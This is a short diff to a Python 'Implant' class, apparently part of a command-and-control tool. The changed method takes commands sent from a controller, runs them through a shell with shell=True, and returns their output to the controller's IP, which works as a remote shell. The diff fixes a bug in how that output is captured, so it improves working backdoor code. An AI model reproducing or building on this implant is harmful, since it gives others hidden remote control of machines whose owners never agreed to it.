@@ -18,12 +18,12 @@ class Implant(Host):
 
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
-        
+
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
             proc = Popen(shlex.split(cmd), shell=True, stdout=PIPE, stderr=PIPE)
-            stdout, _ = proc.communicate()[0]
+            stdout = proc.communicate()[0]
             self.send(self.controller_ip, "instruction", stdout)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
